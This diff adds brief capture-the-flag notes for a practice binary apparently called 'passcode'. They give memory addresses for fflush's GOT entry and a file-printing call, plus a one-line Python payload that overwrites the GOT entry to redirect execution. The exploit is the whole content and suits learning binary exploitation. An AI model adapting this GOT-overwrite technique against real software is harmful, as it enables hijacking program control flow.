@@ -1,0 +1,7 @@
+fflush = 0x0804a004
+
+cat file syscall = 0x080485ea
+
+line after cat file syscall. movl = 0x080485e3
+
+python -c "print 'c'*94 + '\x04\xa0\x04\x08' + '134514147'" | ./passcode
